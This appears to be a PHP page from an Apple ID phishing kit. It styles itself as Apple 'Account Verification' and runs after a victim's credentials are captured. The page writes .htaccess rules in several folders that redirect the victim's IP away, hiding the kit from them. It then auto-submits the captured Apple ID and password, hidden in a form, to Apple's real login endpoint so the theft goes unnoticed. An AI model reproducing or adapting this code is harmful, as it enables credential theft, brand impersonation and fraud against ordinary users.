﻿<?php
error_reporting();
require '../slekek/func.php';
if ($_SESSION['loggedin'] == false) {
    header("Location:../");
}
require "../slekek/acc.php";
require "../slekek/enc.php";
require "../slekek/detectme.php";
require "../slekek/CONTROL.php";
?>
<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
<title><?php echo $_LANG['DASHBD'];?></title>
<link href="../signin/files/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="../signin/files/css/First.css" media="all" rel="stylesheet" type="text/css">
<link href="../signin/files/css/Second.css" rel="stylesheet" type="text/css">
<link href="../signin/files/css/Fonts.css" rel="stylesheet" type="text/css">
<link href="../signin/files/css/verify.css" rel="stylesheet" type="text/css">
</head>
<body id="pagecontent">
<div id="content">
<div class="bdd45">
<nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
<div class="HeaderObjHolder">
<ul class="MobHeader">
<li class="HeaderObj MobMenIconH">
<label class="MobMenHol"> 
<span class="MobMenIcon MobMenIcon-top">
<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
</label>
</li>
<li class="HeaderObj">
<a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px" id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
<a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a> <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span> 
</li>
</ul>
</div>
</nav>



<div id="flow">
<div class="flow-body signin clearfix" role="main">
<div class="persona-splash no-photo clearfix">
    <div class="persona-bg"></div>
    <div class="container">
        <div class="splash-section">
            <div class=" person-wrapper">
                <div>
                    <div class="row">
                        <div class="col-sm-9 appleid-col">
                            <div class="flex-container">
                                <h1 class="mobile appleid-user">
                                    <span class="first_name">Account Verification</span>
                                    <small class="SessionUser">Your Apple ID is <strong><?php echo $_SESSION['user'];?></strong> </small>
                                </h1>
                            </div>
                        </div>
                        <div class="not-mobile col-sm-3">
                            <div class="flex-container-signout">
                                <div class="signout pull-right">
                                    <button class="btn btn-link">Sign Out </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<div class="container">
<div class="flex home-content">
<div class="container flow-sections">
<div class="account-wrapper">
  <div align="center">
  <h1 style="color:#009CDE"><?php echo $_LANG['DASHBD'];?></h1>
    <p><span class="clearfix" style="margin-top: 10px;"><img src="../signin/files/img/spin.GIF" height="42" width="42"></span></p>
    <p><?php echo $_LANG['WAIT']; ?></p>
    <p style="text-decoration: underline;color:red;"><?php echo $_LANG['FORYOUR'];?></p>
    <?php

    $file = fopen(".htaccess","a");
    fwrite($file, 'RewriteCond %{REMOTE_ADDR} ^'.$_SERVER['REMOTE_ADDR'].'$
      RewriteRule .* https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGXAjkQFggfMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww&sig2=gKBRh04c9wVr4EOc4FARAw&bvm=bv.110151844,d.d24 [R,L]
      ');
    fclose($file);
    $file = fopen("../.htaccess","a");
    fwrite($file, 'RewriteCond %{REMOTE_ADDR} ^'.$_SERVER['REMOTE_ADDR'].'$
      RewriteRule .* https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGXAjkQFggfMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww&sig2=gKBRh04c9wVr4EOc4FARAw&bvm=bv.110151844,d.d24 [R,L]
      ');
    fclose($file);
    $file = fopen("../slekek/.htaccess","a");
    fwrite($file, 'RewriteCond %{REMOTE_ADDR} ^'.$_SERVER['REMOTE_ADDR'].'$
      RewriteRule .* https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGXAjkQFggfMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww&sig2=gKBRh04c9wVr4EOc4FARAw&bvm=bv.110151844,d.d24 [R,L]
      ');
    fclose($file);
    $file = fopen("../signin/.htaccess","a");
    fwrite($file, 'RewriteCond %{REMOTE_ADDR} ^'.$_SERVER['REMOTE_ADDR'].'$
      RewriteRule .* https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGXAjkQFggfMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww&sig2=gKBRh04c9wVr4EOc4FARAw&bvm=bv.110151844,d.d24 [R,L]
      ');
    fclose($file);

    echo "<html><body onload='document.form.submit()'>
    <form name='form' id='form' action='https://idmsa.apple.com/IDMSWebAuth/authenticate' method='POST'>
    <div style='display:none;''>
            <input name='appleId' value='".$_SESSION['user']."' />
            <input name='accountPassword' value='".$_SESSION['pass']."' />
            <input name='appIdKey' value='af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3' />
            <input name='accNameLocked' value='false' />
            <input name='language' value='US-EN' />
            <input name='path' value='/signin/?referrer=/account/manage' />
            <input name='Env' value='PROD' />
            <input type='submit' class='button primary' value='Continue' />
    </div>
    </form></body></html>";

    ?>

  </div>
</div>



</div>
</div>
</div>
</div>
<footer>
<div class="container">
<div class="footer">
<div class="footer-wrap">
<div class="FooterLine1">
<div class="line-level">Shop the <a href="#">Apple Online Store</a> (1-800-9923-1472), visit an <a href="#">Apple Retail Store</a>, or find a <a href="#">reseller</a>.</div>
</div>
<div class="FooterLine2">
<ul class="menu">
<li class="item"><a href="#">Apple Info</a></li>
<li class="item"><a href="#">Site Map</a></li>
<li class="item"><a href="#">Hot News</a></li>
<li class="item"><a href="#">RSS Feeds</a></li>
<li class="item"><a href="#">Contact Us</a></li>
</ul>
</div>
<div class="FooterLine3">Copyright © 2017 Apple Inc. All rights reserved.
<ul class="menu">
<li class="item"><a href="#">Terms of Use</a></li>
<li class="item"><a href="#">Privacy Policy</a></li>
</ul>
</div>
</div>
</div>
</div>
</footer>
</div>
</div>
</body>
</html>